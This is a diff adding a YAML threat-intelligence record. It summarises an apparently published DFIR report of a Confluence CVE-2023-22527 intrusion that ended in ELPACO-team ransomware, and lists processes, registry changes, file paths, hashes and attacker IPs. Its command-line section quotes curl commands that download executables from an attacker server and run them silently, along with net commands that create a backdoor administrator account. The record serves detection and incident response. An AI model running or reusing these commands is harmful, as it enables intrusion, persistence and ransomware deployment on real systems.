@@ -1,0 +1,72 @@
+description: "An attacker exploited CVE\u20112023\u201122527 against an unpatched\
+  \ Confluence server, used Metasploit loaders to drop AnyDesk and other tools, escalated\
+  \ privileges via named pipe impersonation, dropped Mimikatz for credential dumping,\
+  \ and deployed ELPACO\u2011team ransomware."
+attribution: APT group unknown; activity linked to multiple threat actors including
+  those using Metasploit, Mimikatz, and AnyDesk.
+malware_families:
+- ELPACO-team
+- HAHLGiDDb.exe
+- RfHBBgXXYF.exe
+- ZqYeqEZtohD.exe
+- AnyDesk.exe
+- mimikatz.exe
+TTPs:
+  processes:
+  - cmd.exe
+  - curl.exe
+  - tomcat9.exe
+  - AnyDesk.exe
+  - RfHBBgXXYF.exe
+  - HAHLGiDDb.exe
+  - ZqYeqEZtohD.exe
+  - net.exe
+  commandline:
+  - cmd.exe /c "curl -sko %%TEMP%%\\RfHBBgXXYF.exe https://91.191.209.46:8080/YIDRANysdqsFrhht5dDNDw
+    & start /B %%TEMP%%\\RfHBBgXXYF.exe"
+  - cmd.exe /c "curl -sko %%TEMP%%\\HAHLGIDDb.exe https://91.191.209.46:8080/YIDRANysdqsFrhht5dDNDw
+    & start /B %%TEMP%%\\HAHLGIDDb.exe"
+  - cmd.exe /c "curl -sko %%TEMP%%\\ZqYeqEZtohD.exe https://91.191.209.46:8080/YIDRANysdqsFrhht5dDNDw
+    & start /B %%TEMP%%\\ZqYeqEZtohD.exe"
+  - net user noname Slepoy_123 /add /Passwordchg:Yes
+  - net localgroup Administrators noname /add
+  powershell: []
+  scripting_engine: []
+  registry_keys:
+  - HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware
+  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server
+  image_load: []
+  network_connections:
+  - process: curl.exe
+    destination: 91.191.209.46:8080
+  file_activity:
+  - C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\HAHLGiDDb.exe
+  - C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\nbjlop.dll
+  - C:\\Program Files\\Atlassian\\Confluence\\AnyDesk.exe
+  - C:\\Program Files\\Atlassian\\Confluence\\u1.bat
+  - C:\\Program Files\\Atlassian\\Confluence\\spider.dll
+  - C:\\Windows\\SERVIC~1\\NETWOR~1\\AppData\\Local\\Temp\\RfHBBgXXYF.exe
+  - C:\\Windows\\SERVIC~1\\NETWOR~1\\AppData\\Local\\Temp\\HAHLGiDDb.exe
+  persistence:
+  - Created local admin account noname via u1.bat
+  - Installed AnyDesk as a service (AnyDesk.exe --start-service)
+  - Modified registry to enable RDP and disable Windows Defender
+  - Service Creation
+  - DLL Dropper
+  process_relations: []
+IOCs:
+  hashes:
+  - 0b83f2667abff814bb724808c404396e6ad417591165f1762a8e99ec108d4996
+  ips:
+  - 45.227.254.124
+  - 91.191.209.46
+  domains: []
+  urls:
+  - https://91.191.209.46:8080/YIDRANysdqsFrhht5dDNDw
+authors:
+- pcsc0ut
+- IrishDeath
+- Tornado
+reference: https://thedfirreport.com/2025/05/19/another-confluence-bites-the-dust-falling-to-elpaco-team-ransomware
+date_of_publication: May 19, 2025
+file_creation_date: October 05, 2025
